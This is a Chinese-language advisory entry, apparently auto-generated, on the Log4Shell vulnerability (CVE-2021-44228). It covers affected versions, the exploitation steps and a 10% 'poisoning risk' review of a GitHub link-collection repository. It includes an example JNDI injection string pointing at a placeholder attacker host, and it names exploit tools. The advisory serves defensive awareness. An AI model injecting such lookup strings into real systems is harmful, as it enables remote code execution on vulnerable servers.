## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version < 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。需要目标服务器开启JNDI功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以通过发送特制的日志请求，利用Log4j2的JNDI功能来执行任意代码。\n\n**漏洞利用方式：**\n\n1.  攻击者向使用存在漏洞的Log4j2组件的应用程序发送包含恶意JNDI查找字符串的请求。例如： `${jndi:ldap://attacker.com/evil}`\n2.  Log4j2在记录日志时，会解析该JNDI字符串，并尝试通过LDAP协议连接到攻击者控制的服务器（attacker.com）。\n3.  攻击者的LDAP服务器返回一个包含Java对象的引用。\n4.  Log4j2尝试加载并实例化该Java对象，从而导致攻击者控制的代码在服务器上执行。\n\n**有效性：** 根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。该漏洞已被广泛利用，并且互联网上存在大量的POC和利用工具。\n\n**投毒风险：**\n查看了提供的“漏洞利用代码”仓库的内容列表，主要包含以下信息:\n*   Advisory.md：提供漏洞相关的建议和缓解措施的链接。\n*   Exploitation.md：提供漏洞利用相关的链接，例如渗透测试指南和JNDI注入工具。\n*   Honeypots.md：提供蜜罐相关的链接。\n*   IOCs-Callback-Domains-IP-Addresses.md：提供IOC（Indicator of Compromise）和回调URL/IP地址的链接。\n*   Malware-Reports.md：提供恶意软件报告的链接。\n*   Mitigations-Fixes.md：提供缓解和修复措施的链接。\n*   Payloads-Obfuscation-WAF-Bypass.md：提供payload、混淆和WAF绕过相关的链接。\n\n总体而言，这个仓库主要是一个资源链接的集合，提供了关于CVE-2021-44228（Log4Shell）的各种信息，包括漏洞建议、利用方法、IOC、缓解措施和payload。\n\n其中`Exploitation.md`文件中链接的`JNDI-Injection-Exploit`、`JNDI-Exploit-Kit`和`marshalsec`等工具本身就是漏洞利用工具，如果用户下载并使用这些工具，可能会面临安全风险，例如被植入后门或恶意代码，或者被用于非法用途。但是这些工具本身是为了复现和验证漏洞使用的，并非作者投毒。\n仓库本身提供的信息比较杂乱，需要使用者具备一定的安全知识才能正确评估和使用。存在一定的误导性，有可能被不具备安全知识的人误用，或者被用于恶意目的，因此评估投毒风险为10%。

**项目地址:** [0xsyr0/Log4Shell](https://github.com/0xsyr0/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)